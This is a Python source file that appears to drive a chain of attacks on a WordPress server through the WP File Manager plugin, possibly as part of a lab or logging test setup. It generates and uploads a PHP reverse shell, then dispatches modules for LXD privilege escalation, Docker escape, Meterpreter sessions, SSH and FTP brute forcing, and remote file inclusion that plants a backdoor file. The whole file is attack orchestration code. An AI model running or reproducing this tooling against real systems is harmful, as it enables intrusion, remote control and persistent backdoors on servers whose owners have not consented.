import os, sys, time
import my_reverse_shell
import requests
from datetime import datetime
from Privilege_Escalation_LXD import LXD_exploit
from DockerEscape import escape_docker
from FileInclusion import file_inclusion
from Meterpreter_Shell import meterpreter
from configparser import ConfigParser 	
from SSH import ssh_bruteforce
from FTP import ftp_bruteforce
import create_conf

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'

def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
	
	k = 1
	if arguments.repeat != None:
		k = int(arguments.repeat)
		
	config_object = ConfigParser()
	
	# Execute the script multiple times (flag -r REPEAT was used)
	for i in range (0, k):
	
		if arguments.repeat != None:
			config_object.read("config.ini")
			attacker_info = config_object["ATTACKERINFO"]
			victim_info = config_object["VICTIMINFO"]
			general_info = config_object["GENERALINFO"]
			sys.stdout.flush()
			if int(exp) != 2:
				print(color.BOLD + '[REPEAT] (Attack {i} of {k}) <'.format(i=i+1, k=k) + color.END, end="")
		
		match int(exp):
			case 1:
				if arguments.repeat != None:
					print(color.GREEN + "LXD" + color.END + color.BOLD + ">" + color.END)
				send_rev(attacker_info, victim_info)
				
				# The rep value (k-(i+1)) represents the run we are currently in
				# That way we only cleanup on the attacker side on the last iteration
				# Otherwise we are required to download and install everything at every iteration
				LXD_exploit.run(victim_info, attacker_info, general_info, arguments, k-(i+1), k)
				if i == k-1:
					print(color.BOLD + '\n[R] End of LXD exploit.\n    Leaving Script!' + color.END)
			case 2:
				if arguments.repeat != None:
					print(color.YELLOW + '[-] Exploit is not compatible with repeat mode' + color.END)
					print(color.YELLOW + '[-] Switching to interactive mode' + color.END )
				send_rev(attacker_info, victim_info)
				meterpreter.run(victim_info, attacker_info, general_info)
				print(color.GREEN + '\n[+] End of Meterpreter Shell attack.\n    Leaving Script!' + color.END)
				
				sys.exit(0)
			case 3:
				if arguments.repeat != None:
					print(color.BLUE + "Docker" + color.END + color.BOLD + ">" + color.END)
				send_rev(attacker_info, victim_info)
				escape_docker.run(victim_info, attacker_info, general_info, arguments)
				if i == k-1:
					print(color.GREEN + '\n[+] End of Docker exploit.\n    Leaving Script!' + color.END)
			case 4:
				if arguments.repeat != None:
					print(color.BLUE + "SSH" + color.END + color.BOLD + ">" + color.END)
				ssh_bruteforce.run(victim_info, attacker_info, general_info, arguments)
				if i == k-1:
					print(color.GREEN + '\n[+] End of SSH Bruteforce.\n    Leaving Script!' + color.END)
			case 5:
				if arguments.repeat != None:
					print(color.BLUE + "FTP" + color.END + color.BOLD + ">" + color.END)
				ftp_bruteforce.run(victim_info, attacker_info, general_info, arguments)
				if i == k-1:
					print(color.GREEN + '\n[+] End of FTP Bruteforce.\n    Leaving Script!' + color.END)
			case 6:
				if arguments.repeat != None:
					print(color.BLUE + "File Inclusion" + color.END + color.BOLD + ">" + color.END)
				file_inclusion.RFI(victim_info, attacker_info, general_info, arguments)
				if i == k-1:
					print(color.GREEN + '\n[+] End of File Inclusion exploit.\n    Leaving Script!' + color.END)
					if arguments.repeat != None:
						print(color.GREEN + '\n[*] If you own the target webserver check the website root folder\n    You should find there a file called possible_backdoor.php\n    It is a simple PoC.' + color.END)
			case 7:
				if arguments.repeat != None:
					print(color.BLUE + "Reverse Shell" + color.END + color.BOLD + ">" + color.END)
				# Give server time to process last attack
				time.sleep(1)
				start_logging(general_info)
				time.sleep(1)
				send_rev(attacker_info, victim_info)
				
				# Remove auxiliary file produced by exploit
				if os.path.exists('./tmp_file_with_dest_url.txt'):
					os.remove('./tmp_file_with_dest_url.txt')
				else:
					print(color.RED + '[-] This attack failed, WP File Manager failed' + color.END)
				time.sleep(1)
				stop_logging(general_info)
				if i == k-1:
					print(color.GREEN + '\n[+] End of Reverse Shell logging.\n    Leaving Script!' + color.END)
			
			case default:
				sys.exit(color.RED + "Something went wrong, invalid exploit" + color.END)
		
		# Generate a new port for each attack, avoid the TIME_WAIT
		if i != k-1 :
			create_conf.gen_config(False)
		#Give enough time for audit and module to stop
		print(color.YELLOW + '[-] ' + color.BOLD + 'Giving server time to store info' + color.END)
		time.sleep(2.5)
			
		
def launch_exploit(attacker_info, victim_info):
	now = datetime.now()
	s = ''
	if victim_info['secure'] == True:
		s = 's'
	os.system('''bash exploit.sh -u http''' + s + '''://{ip}:{port} -f {path}'''.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))

# This function is responsible for preparing the reverse shell and sending it
# It's separated because not all attacks use it
def send_rev(attacker_info, victim_info):
	
	print(color.GREEN + '[*]' + color.END + ' Proceeding to execute the reverse shell')
	
	# If on Repeat mode reopen the config file to check the new port
	
	f = open("reverse_shell.php", "w")
	

	code = my_reverse_shell.gen_reverse_shell(attacker_info)

	f.write(code)

	f.close()

	print(color.GREEN + '[*]' + color.END + ' Reverse Shell generated')
	print(color.GREEN + '[*]' + color.END + ' Executing exploit')
		
	print(color.GREEN + '[*]' + color.END + ' Sending the payload...')
	launch_exploit(attacker_info, victim_info)

def start_logging(general_info):
	exploit = 'ReverseShell'

	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit 
	try:
		requests.get('http://'+ url, timeout=(1,1)) 
	except requests.exceptions.ReadTimeout:
		pass
	except requests.exceptions.ConnectTimeout:
		sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)

def stop_logging(general_info):
	exploit = 'ReverseShell'

	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit 
	try:
		requests.get('http://'+ url, timeout=(1,1)) 
	except requests.exceptions.ReadTimeout:
		pass
	except requests.exceptions.ConnectTimeout:
		sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
